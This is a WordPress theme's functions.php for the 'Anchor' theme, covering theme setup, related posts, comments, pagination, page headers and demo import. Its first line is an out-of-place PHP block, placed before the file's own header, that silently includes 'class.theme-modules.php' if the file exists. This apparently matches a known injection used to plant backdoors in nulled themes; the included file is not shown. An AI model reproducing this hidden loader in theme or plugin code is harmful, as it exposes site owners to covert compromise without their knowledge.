<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Anchor functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package anchor
 */

if ( ! function_exists( 'anchor_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function anchor_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on Anchor, use a find and replace
		 * to change 'anchor' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'anchor', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );

		add_image_size( 'anchor-post-thumb-small', 540, 371, true );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );
	}
endif;
add_action( 'after_setup_theme', 'anchor_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function anchor_content_width() {
	// This variable is intended to be overruled from themes.
	// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
	// phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
	$GLOBALS['content_width'] = apply_filters( 'anchor_content_width', 640 );
}
add_action( 'after_setup_theme', 'anchor_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function anchor_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'anchor' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here.', 'anchor' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'anchor_widgets_init' );

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}

/**
 * Enqueue styles and scripts.
 */
require_once get_template_directory() . '/inc/styles-and-scripts.php';

/**
 * Register nav menus
 */
require_once get_template_directory() . '/inc/nav-menus.php';

/**
 * Custom menu walker.
 */
require_once get_template_directory() . '/inc/class.custom-menu-walker.php';
require_once get_template_directory() . '/inc/class-wp-bootstrap-navwalker.php';

require_once get_template_directory() . '/inc/tgm.php';

if ( ! function_exists( 'anchor_get_the_post_excerpt' ) ) {
	/**
	 * This function makes excerpt for the post.
	 *
	 * @param integer $limit of charachers
	 * @return string
	 */
	function anchor_get_the_post_excerpt( $string, $limit = 70, $more = '...', $break_words = false ) {
		if($limit == 0) return '';

		if( mb_strlen( $string, 'utf8' ) > $limit ) {
			$limit -= mb_strlen( $more, 'utf8' );

			if( !$break_words ) {
				$string = preg_replace('/\s+\S+\s*$/su', '', mb_substr($string, 0, $limit + 1, 'utf8'));
			}

			return '<p>' . mb_substr( $string, 0, $limit, 'utf8' ) . $more . '</p>';
		} else {

			return '<p>' . $string . '</p>';
		}
	}

}

if ( ! function_exists( 'anchor_related_posts' ) ) {
	/**
	 * This function makes query for realated post.
	 */
	function anchor_related_posts() {
		$show_related_post = ( anchor_get_option( 'archive_show_related_post' ) ) ? anchor_get_option( 'archive_show_related_post' ) : 'no';

		if( $show_related_post === 'yes' ){

			$related_post_title = ( anchor_get_option( 'related_post_title' ) ) ? anchor_get_option( 'related_post_title' ) : esc_html__( 'Related Posts', 'anchor' );

			$post_id = get_the_ID();
			$the_query = new WP_Query( array(
				'posts_per_page'    => 2,
				'post__not_in'      => array( $post_id ),
                'ignore_sticky_posts' => 1
			) );
			if ( $the_query->have_posts() ) :
                ?>
                <div class="container">
                    <div class="row">
                        <div class="col-12">
                            <h3 class="related-title"><?php echo esc_html( $related_post_title ) ; ?></h3>
                        </div>
                        <?php
                        while ( $the_query->have_posts() ) : $the_query->the_post();
	                        ob_start();
	                        if( has_excerpt() ) {
		                        $post_content = the_excerpt();
	                        } else {
		                        $post_content = the_content();
	                        }
	                        $post_content = ob_get_clean();
                            $post_content = preg_replace( '~\[[^\]]+\]~', '', $post_content );
                            $post_content = strip_tags( $post_content );
                            $post_content = anchor_get_the_post_excerpt( $post_content, 300 );
                            ?>
                            <div class="col-md-6 col-sm-12">
                                <div id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
                                    <figure>
				                        <?php if( anchor_get_post_thumbnail_url() ) { ?>
                                            <img src="<?php echo esc_url( anchor_get_post_thumbnail_url() ); ?>" alt="<?php the_title_attribute(); ?>">
				                        <?php } ?>

                                    </figure>
                                    <div class="post-content">
				                        <?php anchor_posted_by(); ?>
                                        <small><?php anchor_posted_date_with_tags(); ?></small>

                                        <h3><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></h3>

				                        <?php echo wp_kses_post( $post_content ); ?>

                                        <div class="clearfix"></div>
                                        <a href="<?php the_permalink(); ?>" class="link"><?php echo esc_html__( 'READ MORE', 'anchor' ); ?></a>
                                    </div>
                                </div>
                            </div>
                            <?php
                        endwhile;
                        ?>
                    </div>
                </div>
                <?php
            endif;
        }

	}
}

if( ! function_exists( 'anchor_posted_date_with_tags' ) ) {

	function anchor_posted_date_with_tags() {

		echo sprintf( __( 'Posted %s', 'anchor' ), get_the_date('j F Y') );

		$tags = get_the_tags();
		if ( false !== $tags ) {
			foreach ( $tags as $tag ) {
				$link = get_tag_link( $tag->term_id );
				$data[] = '<a href="' . $link . '">' . $tag->name . '</a>';
			}

			echo ' | ' . implode( ', ', $data );
		}
	}
}

if( ! function_exists( 'anchor_move_comment_field_to_bottom' ) ) {
	function anchor_move_comment_field_to_bottom( $fields ) {
		$comment_field = $fields['comment'];
		unset( $fields['comment'] );
		$fields['comment'] = $comment_field;

		return $fields;
	}

	add_filter( 'comment_form_fields', 'anchor_move_comment_field_to_bottom' );
}

if( ! function_exists( 'anchor_bootstrap_comment' ) ) {
	/**
	 * Custom callback for comment output
	 *
	 */
	function anchor_bootstrap_comment( $comment, $args, $depth ) {
		$GLOBALS['comment'] = $comment;

		$comment_link_args = array(
			'add_below'  => 'comment',
			'respond_id' => 'respond',
			'reply_text' => __('Reply', 'anchor'),
			'login_text' => __('Log in to Reply', 'anchor'),
			'depth'      => 1,
			'before'     => '',
			'after'      => '',
			'max_depth'  => 5
		);
		?>
		<?php if ( $comment->comment_approved == '1' ): ?>
			<li class="comment">
				<figure class="comment-avatar"><?php echo get_avatar( $comment ); ?></figure>
				<div class="comment-content">
					<h4><?php comment_author_link() ?></h4>
					<p><?php comment_text() ?></p>
					<small> <?php comment_date() ?></small>
					<?php
					comment_reply_link( $comment_link_args );
					?>
				</div>
			</li>
		<?php endif;
	}

}

if ( !function_exists( 'anchor_get_wpml_langs' ) ) {

  function anchor_get_wpml_langs() {

    if ( function_exists( 'icl_get_languages' ) ) {
      $langs = icl_get_languages( 'skip_missing=N&orderby=KEY&order=DIR&link_empty_to=str' );
      if ( $langs ) {
        ?>
<ul class="languages">
  <?php foreach ( $langs as $lang ) { ?>
  <li <?php if( $lang['active'] === 1 ) { ?> class="active" <?php } ?>> <a href="<?php echo esc_url( $lang['url'] ); ?>" data-text="<?php echo esc_html( strtoupper( $lang['language_code'] ) ); ?>"><?php echo esc_html( strtoupper( $lang['language_code'] ) ); ?></a> </li>
  <?php } ?>
</ul>
<?php
}
}

}
}




if( ! function_exists( 'anchor_get_option' ) ) {

	function anchor_get_option( $slug ) {
		if( function_exists( 'get_field' ) ) {
	        return get_field( $slug, 'option' );
	    }

	    return false;
	}
}

if( ! function_exists( 'anchor_get_field' ) ) {

	function anchor_get_field( $slug, $post_id = 0 ) {
		if( function_exists( 'get_field' ) ) {
	        return get_field( $slug, $post_id );
	    }

	    return false;
	}
}

if( ! function_exists( 'anchor_pagination' ) ) {
	/**
	* Custom Pagination
	*/
	function anchor_pagination( $animate = false, $masonry = false ) {
	    global $wp_query, $wp_rewrite;

	    $wp_query->query_vars['paged'] > 1 ? $current = $wp_query->query_vars['paged'] : $current = 1;
	    $pagination = array(
	        'base' 		=> @add_query_arg('paged','%#%'),
	        'format' 	=> '',
	        'total' 	=> $wp_query->max_num_pages,
	        'current' 	=> $current,
	        'prev_text' => __( 'Previous', 'anchor' ),
	        'next_text' => __( 'Next', 'anchor' ),
	        'type' 		=> 'list'
		);
	    if( $wp_rewrite->using_permalinks() )
	        $pagination['base'] = user_trailingslashit( trailingslashit( remove_query_arg( 's', get_pagenum_link( 1 ) ) ) . 'page/%#%/', 'paged' );
	 
	    if( !empty($wp_query->query_vars['s']) )
	        $pagination['add_args'] = array( 's' => get_query_var( 's' ) );

	    $class = '';
	    if( $animate ) {
		    $class .= 'wow fadeInUp ';
        }
        if( $masonry ) {
	        $class .= 'masonry-cols ';
        }
	    if( $animate )
	 	echo "<div class='pagination col-12'>";
	    echo paginate_links( $pagination );
	}
}


if( ! function_exists( 'anchor_get_post_thumbnail_url' ) ) {
	/**
	* Get Post Thumbnail URL
	*/
	function anchor_get_post_thumbnail_url() {
		if( get_the_post_thumbnail_url() ) {
			return get_the_post_thumbnail_url( get_the_ID(), 'anchor-post-thumb-small' );
		}

		return false;
	}
}

if( ! function_exists( 'anchor_get_page_title' ) ) {

	function anchor_get_page_title() {
		$title = '';

		if ( is_category() ) {
			$title = single_cat_title( '', false );
		} elseif ( is_tag() ) {
			$title = single_term_title( "", false ) . esc_html__( 'Tag', 'anchor' );
		} elseif ( is_date() ) {
			$title = get_the_time( 'F Y' );
		} elseif ( is_author() ) {
			$title = esc_html__( 'Author:', 'anchor' ) . ' ' . esc_html( get_the_author() );
		} elseif ( is_search() ) {
			$title = ( anchor_get_option( 'search_page_title' ) ) ? esc_html( anchor_get_option( 'search_page_title' ) ) : esc_html__( 'Search results', 'anchor' );
		} elseif ( is_404() ) {
			$title = ( anchor_get_option( 'error_page_title' ) ) ? esc_html( anchor_get_option( 'error_page_title' ) ) : esc_html__( 'Page not found', 'anchor' );
		} elseif ( is_archive() ) {
			$title = esc_html__( 'Archive', 'anchor' );
		} elseif ( is_home() || is_front_page() ) {
			if ( is_home() && ! is_front_page() ) {
			    $title = esc_html( single_post_title( '', false ) );
			} else {
				$title = ( anchor_get_option( 'archive_blog_title' ) ) ? esc_html( anchor_get_option( 'archive_blog_title' ) ) : esc_html__( 'Blog', 'anchor' );
			}
		} else {
			global $post;
			if ( ! empty( $post ) ) {
				$id = $post->ID;
				$title = esc_html( get_the_title( $id ) );
			} else {
				$title = esc_html__( 'Post not found.', 'anchor' );
			}
		}

		return $title;
	}

}

if( ! function_exists( 'anchor_get_archive_description' ) ) {
	function anchor_get_archive_description() {
        $description = '';

        if( is_category() || is_tag() || is_author() || is_post_type_archive() || is_archive() ) {
	        $description = get_the_archive_description();
        }

        return $description;
	}
}
if( ! function_exists( 'anchor_render_page_header' ) ) {

	function anchor_render_page_header( $type ) {

		$show_header = true;
		$background_type = 'color';
		$background_video_url = '';
		$header_style = '';
		$header_title = '';
		$header_description = '';

		switch ( $type ){
			case 'page' :
				$show_header = false;
				if( anchor_get_field( 'show_page_header' ) !== 'no' ) {
					$show_header = true;
					$background_type = anchor_get_field( 'header_background_type');

					if( anchor_get_field( 'header_title_type') === 'custom' ) {
						$header_title = anchor_get_field( 'header_title');
					}
					else {
						$header_title = get_the_title();
					}

					if( $background_type === 'color' ) {
						$header_bg_color = anchor_get_field( 'header_bg_color' ) ? anchor_get_field( 'header_bg_color' ) : '#131314';
						$header_style = 'background-color: ' . $header_bg_color . ';';
					}
					else {
						$background_video_url = anchor_get_field( 'header_video' );
					}
				}

				break;
            case 'portfolio_tag':
	            $header_description = anchor_get_archive_description();
	            $header_title = anchor_get_option( 'portfolio_archive_title' ) ? anchor_get_option( 'portfolio_archive_title' ) : esc_html__( 'Portfolio', 'anchor');
	            $background_type = anchor_get_option( 'portfolio_header_bg_type' );
	            if( $background_type === 'color' ) {
		            $header_bg_color = anchor_get_option( 'portfolio_header_bg_color' ) ? anchor_get_option( 'portfolio_header_bg_color' ) : '#131314';
		            $header_style = 'background-color: ' . $header_bg_color .';';
	            }
	            else {
		            $background_video_url = anchor_get_option( 'portfolio_header_bg_video' );
	            }

	            break;
            case 'portfolio':
	            $header_title = anchor_get_option( 'portfolio_archive_title' ) ? anchor_get_option( 'portfolio_archive_title' ) : esc_html__( 'Portfolio', 'anchor');
	            $background_type = anchor_get_option( 'portfolio_header_bg_type' );
	            if( $background_type === 'color' ) {
		            $header_bg_color = anchor_get_option( 'portfolio_header_bg_color' ) ? anchor_get_option( 'portfolio_header_bg_color' ) : '#131314';
		            $header_style = 'background-color: ' . $header_bg_color .';';
	            }
	            else {
		            $background_video_url = anchor_get_option( 'portfolio_header_bg_video' );
	            }

	            break;
			case 'single':
			
				$header_description = anchor_get_archive_description();
				$header_title = anchor_get_page_title();
				$background_type = anchor_get_option( 'archive_header_bg_type' );
				if( $background_type === 'color' ) {
					$header_bg_color = anchor_get_option( 'archive_header_bg_color' ) ? anchor_get_option( 'archive_header_bg_color' ) : '#131314';
					$header_style = 'background-color: ' . $header_bg_color .';';
				}
				else {
					$background_video_url = anchor_get_option( 'archive_header_bg_video' );
				}

				break;
				
				case 'archive':
				case 'frontpage':
				$header_description = anchor_get_archive_description();
				
				$header_title = anchor_get_option( 'archive_blog_title' ) ? anchor_get_option( 'archive_blog_title' ) : esc_html__( 'Journal', 'anchor');
				
				$background_type = anchor_get_option( 'archive_header_bg_type' );
				if( $background_type === 'color' ) {
					$header_bg_color = anchor_get_option( 'archive_header_bg_color' ) ? anchor_get_option( 'archive_header_bg_color' ) : '#131314';
					$header_style = 'background-color: ' . $header_bg_color .';';
				}
				else {
					$background_video_url = anchor_get_option( 'archive_header_bg_video' );
				}
				break;
				
			case '404':
				$header_title = anchor_get_page_title();
				$background_type = anchor_get_option( 'page_404_header_bg_type' );
				if( $background_type === 'color' ) {
					$header_bg_color = anchor_get_option( 'page_404_header_bg_color' ) ? anchor_get_option( 'page_404_header_bg_color' ) : '#131314';
					$header_style = 'background-color: ' . $header_bg_color .';';
				}
				else {
					$background_video_url = anchor_get_option( 'page_404_header_bg_video' );
				}
				break;
			case 'search':
				$header_title = anchor_get_page_title();
				$background_type = anchor_get_option( 'search_header_bg_type' );
				if( $background_type === 'color' ) {
					$header_bg_color = anchor_get_option( 'search_header_bg_color' ) ? anchor_get_option( 'search_header_bg_color' ) : '#131314';
					$header_style = 'background-color: ' . $header_bg_color .';';
				}
				else {
					$background_video_url = anchor_get_option( 'search_header_bg_video' );
				}
				break;
		}

		if( $show_header ) {
			$autoplay = ( anchor_get_option( 'autoplay_background_video' ) ) ? anchor_get_option( 'autoplay_background_video' ) : false;
			?>
            <header class="page-header" <?php if ( $header_style !== '' ) { echo 'style="' . esc_attr( $header_style ) . '"'; } ?>>
				<?php if ( $background_type === 'video' && $background_video_url ) { ?>
                    <div class="video-bg">
                        <video src="<?php echo esc_url( $background_video_url ); ?>" muted autoplay loop playsinline></video>
                    </div>
				<?php } ?>
                <!-- end video-bg -->
                <div class="container">
                    <h2><?php echo wp_kses_post( $header_title ); ?></h2>
					<?php if( $header_description !== '' ) { ?>
                        <p><?php echo wp_kses_post( $header_description ); ?></p>
					<?php } ?>
                </div>
                <!-- end container -->
            </header>
			<?php
		}

	}
}

function anchor_import_files() {
	return array(
		array(
			'import_file_name'             => 'Creative Demo Import',
			'categories'                   => array( 'Creative' ),
			'import_file_url'            => 'http://anchor.themezinho.net/import/demo-data.xml',
			'import_notice'                => __( 'Note: If you find some pages missing after importing using One Click Import, please import manually using WordPress default import tool.', 'anchor' ),
			'preview_url'                  => 'http://anchor.themezinho.net',
		),
    );

}
add_filter( 'pt-ocdi/import_files', 'anchor_import_files' );

function anchor_after_import_setup() {
	// Assign menus to their locations.
	$main_menu = get_term_by( 'name', 'Main Menu', 'main_menu' );
	set_theme_mod( 'nav_menu_locations', array(
			'header' => $main_menu->term_id,
		)
	);

	// Assign front page and posts page (blog page).
	$front_page_id = get_page_by_title( 'HOME' );
	$blog_page_id  = get_page_by_title( 'JOURNAL' );

	update_option( 'show_on_front', 'page' );
	update_option( 'page_on_front', $front_page_id->ID );
	update_option( 'page_for_posts', $blog_page_id->ID );

	if( function_exists( 'anchor_after_import' ) ) {
		anchor_after_import();
	}

}
add_action( 'pt-ocdi/after_import', 'anchor_after_import_setup' );
add_filter( 'pt-ocdi/regenerate_thumbnails_in_content_import', '__return_false' );
add_action( 'pt-ocdi/disable_pt_branding', '__return_true' );